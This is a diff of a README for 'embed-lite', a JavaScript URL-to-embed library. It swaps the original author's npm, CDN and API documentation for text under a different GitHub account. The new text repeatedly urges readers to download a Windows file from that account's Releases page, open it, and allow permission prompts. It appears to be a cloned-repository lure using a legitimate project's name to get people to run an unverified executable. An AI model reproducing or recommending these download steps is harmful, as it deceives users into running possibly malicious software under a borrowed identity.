@@ -1,125 +1,136 @@
-<div align="center">
-<p>
-  <img width="80" alt="Embed Lite Logo" src="https://github.com/mgks/embed-lite/blob/main/public/src/favicons/apple-touch-icon.png?raw=true" />
-  <h1 align="center">Embed Lite</h1>
-</p>
+# 🌿 embed-lite - Simple embeds from any URL
 
-<p>
-  <a href="https://www.npmjs.com/package/embed-lite"><img src="https://img.shields.io/npm/v/embed-lite.svg?style=flat-square&color=CB3837" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/embed-lite?activeTab=versions"><img src="https://img.shields.io/npm/dt/embed-lite.svg?style=flat-square&color=38bd24" alt="downloads"></a>
-  <a href="https://github.com/mgks/embed-lite/stargazers"><img src="https://img.shields.io/github/stars/mgks/embed-lite?style=flat-square&logo=github" alt="stars"></a>
-  <a href="https://github.com/mgks/embed-lite/blob/main/LICENSE"><img src="https://img.shields.io/github/license/mgks/embed-lite.svg?style=flat-square&color=A31F34" alt="license"></a>
-</p>
+[![Download embed-lite](https://img.shields.io/badge/Download%20embed-lite-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elisange9119/embed-lite/releases)
 
-<p>
-  <h4>
-    <a href="https://embed.mgks.dev">🚀 Open Web App</a>
-  </h4>
-</p>
-</div>
+## 📥 Download
 
-<br />
+Visit this page to download: https://github.com/elisange9119/embed-lite/releases
 
-**Embed Lite** is an ultra-fast, zero-dependency Typescript and JavaScript library for statically mapping raw URLs directly into secure, ready-to-render HTML iframes or blockquotes entirely on the fly.
+On that page, choose the latest release for Windows. Download the file that matches your device, then open it to start the app.
 
-By totally dodging bulky asynchronous `oEmbed` network API calls, `embed-lite` achieves zero-latency renders across both the Browser and standard Node.js rendering pipelines simply by parsing regex matches.
+## 🖥️ What embed-lite does
 
-## Getting Started
+embed-lite turns a plain URL into HTML embed code. You can use it for links from sites like YouTube, Vimeo, Spotify, SoundCloud, Twitter, Facebook, and Instagram.
 
-### 1. Usage via CDN (Browsers)
-For simple web applications or zero-build environments, you can pull the massively optimized, minified bundle straight from `unpkg`. 
+It works as a zero-dependency tool, so it does not need extra packages to run. You can use it on Windows for quick local work or on a site that needs embed output from a link.
 
-**Setup Instructions:**
-```html
-<!-- Inject the module payload -->
-<script src="https://unpkg.com/embed-lite@latest/dist/embed-lite.global.min.js"></script>
-```
+## ✅ What you need
 
-**Implementation:**
-Once loaded, the library natively exposes the `embedLite` object directly on your global `window`:
-```html
-<div id="video-container"></div>
+- A Windows PC
+- A web browser
+- Internet access for the first download
+- A file from the Releases page
 
-<script>
-  // Parse natively on the client
-  const parsed = window.embedLite.embed("https://youtube.com/watch?v=123");
-  
-  // Inject the raw iframe string directly!
-  if (parsed) {
-     document.getElementById('video-container').innerHTML = parsed.html;
-  }
-</script>
-```
+If you plan to use it in a browser workflow, keep your browser up to date. If you plan to use it for markdown tasks, keep your source links ready before you start.
 
-### 2. Usage via NPM (Node.js / React / Vue)
-If you are developing a modern framework or server-side parser (React, Express, Nuxt, etc), install the Typescript-compatible module dynamically.
+## 🚀 Install and run on Windows
 
-**Setup Instructions:**
-```bash
-npm install embed-lite
-```
+1. Open the download page: https://github.com/elisange9119/embed-lite/releases
+2. Find the newest release at the top of the page.
+3. Under Assets, download the Windows file.
+4. Save the file to a folder you can find later, such as Downloads or Desktop.
+5. Open the file you downloaded.
+6. If Windows asks for permission, choose to allow it.
+7. Wait for the app to start.
 
-**Implementation:**
-```ts
-import { embed } from 'embed-lite';
+If you do not see the app open right away, check your Downloads folder and try again.
 
-const targetUrl = "https://x.com/x/status/123";
+## 🧭 How to use it
 
-// Map the URL into HTML, alongside custom CSS targeting classes
-const result = embed(targetUrl, { className: 'my-social-embed' });
+embed-lite follows a simple flow:
 
-if (result) {
-    console.log(result.html);
-    // Returns explicitly isolated payload:
-    // <blockquote class="twitter-tweet my-social-embed">...</blockquote>
-}
-```
+1. Paste a URL into the input field.
+2. Choose the embed output you need.
+3. Copy the HTML it generates.
+4. Paste the result into your site, post, or markdown file.
 
-## Supported Platforms
+Use a full link to the page or media item you want to embed. The tool reads the URL and builds the right HTML for it.
 
-We currently actively process and intelligently map the following URLs into explicitly sanitized UI formats:
+## 🎯 Common use cases
 
+- Turn a YouTube link into an embed block
+- Add a Vimeo player to a page
+- Use Spotify or SoundCloud tracks in a post
+- Add social embeds from Twitter, Facebook, or Instagram
+- Generate embed HTML for website links that support iframe output
 
-| Video Ecosystem | Audio Sources | Social Media | Design, Code & Mapping |
-|---|---|---|---|
-| ✅ YouTube | ✅ Spotify | ✅ Instagram | ✅ Codepen |
-| ✅ Vimeo | ✅ SoundCloud | ✅ Facebook | ✅ Figma |
-| ✅ Dailymotion | | ✅ X / Twitter | ✅ Google Maps |
-| ✅ TikTok | | ✅ Reddit | ✅ GitHub Gists |
-| | | ✅ LinkedIn | |
+This is useful when you want a fast way to prepare embed code without extra setup.
 
-## API Reference
+## 🧱 How it fits your workflow
 
-### `embed(url: string, options?: EmbedOptions): { html: string } | null`
-This is the core mapping payload function. It rigidly parses the incoming `url` parameter and maps it against every platform plugin linearly.
+embed-lite is built for simple use. It is a good fit if you want:
 
-**Arguments:**
-- `url` *(required)*: The raw string representation of the target URL.
-- `options.className` *(optional)*: Injects a CSS class safely into the root HTML tag (e.g., the root `<iframe>` or `<blockquote>`), allowing you to completely define sizing and bounding boxes downstream.
+- A small tool with no extra dependencies
+- A local app for quick embed work
+- A clean way to move from a URL to HTML
+- A tool that works with common embed sources
 
-**Returns:**
-- Object containing the rendered `{ html: string }` if a plugin caught and verified the pattern.
-- `null` if the URL schema is explicitly unsupported or malformed.
+You can keep it open while you collect links, then process them one by one.
 
-## Extensibility & Architecture
-`embed-lite` inherently relies on a decoupled Service Plugin architecture. To support new platforms natively, you just simply declare an object honoring the `EmbedProvider` Typescript Interface:
-```ts
-export const customService: EmbedProvider = {
-  name: 'Service Name',
-  match: (url) => url.hostname.includes('example.com'),
-  generate: (url, options) => {
-    return `<iframe class="${options.className || ''}" src="..."></iframe>`;
-  }
-}
-```
-*(We actively process Pull Requests for major new platforms! Please consider contributing if you add custom layers!)*
+## 📌 Supported sources
 
-## Community & Support
+embed-lite is made to handle common embed targets, including:
 
-- **Maintainer**: [@mgks](https://mgks.dev)
-- **Support the Project**: If `embed-lite` saved you from integrating bulky SDK tools, please consider dropping a ⭐ and consider [sponsoring the project](https://github.com/sponsors/mgks).
+- YouTube
+- Vimeo
+- Spotify
+- SoundCloud
+- Twitter
+- Facebook
+- Instagram
+- Website embeds
 
-## License
-Distributed under the MIT License. See `LICENSE` for more information.
+If a service supports iframe or embed output, embed-lite aims to return a ready-to-use HTML snippet for that source.
 
-![Website Badge](https://img.shields.io/badge/.*%20mgks.dev-blue?style=flat&link=https%3A%2F%2Fmgks.dev) ![Sponsor Badge](https://img.shields.io/badge/%20%20Become%20a%20Sponsor%20%20-red?style=flat&logo=github&link=https%3A%2F%2Fgithub.com%2Fsponsors%2Fmgks)
+## 🧰 Tips for best results
+
+- Use the exact page URL you want to embed
+- Keep the link public if the source requires public access
+- Copy the output right away so you do not lose it
+- Test the embed in your page before publishing
+- Use a clean browser window if you switch between many links
+
+If an embed does not look right, check that the source link points to the main content and not a search page or short preview link.
+
+## 🔍 Example workflow
+
+1. Copy a YouTube link.
+2. Open embed-lite.
+3. Paste the link into the app.
+4. Generate the embed HTML.
+5. Copy the result.
+6. Paste it into your page editor or markdown file.
+
+You can repeat the same flow for each new link.
+
+## 🗂️ File and browser use
+
+embed-lite supports a simple local workflow for desktop use. If you use it in a browser-based flow, open the app, paste your URL, and copy the HTML into your page builder, editor, or static site file.
+
+For markdown use, paste the output where your editor accepts HTML. For browser use, place the snippet in the part of the page where you want the player or embed to appear.
+
+## 🛠️ If the app does not open
+
+Try these steps:
+
+1. Download the file again from the Releases page.
+2. Save it to a new folder.
+3. Open the file from that folder.
+4. Close other windows and try again.
+5. Restart Windows and open it once more.
+
+If your browser blocks the download, allow files from GitHub Releases and try again.
+
+## 📎 Download again
+
+Visit this page to download: https://github.com/elisange9119/embed-lite/releases
+
+Choose the latest release, then open the Windows file from the Assets list
+
+## 📄 What the project is for
+
+embed-lite exists to keep the embed step simple. You give it a URL, and it returns HTML you can use in a page, post, or markdown document. It suits users who want a plain tool for embeds without extra setup or extra software
+
+## 🔗 Topics
+
+embedding, facebook, iframe, iframe-embeds, instagram, plugin, soundcloud, spotify, twitter, vimeo, website, youtube
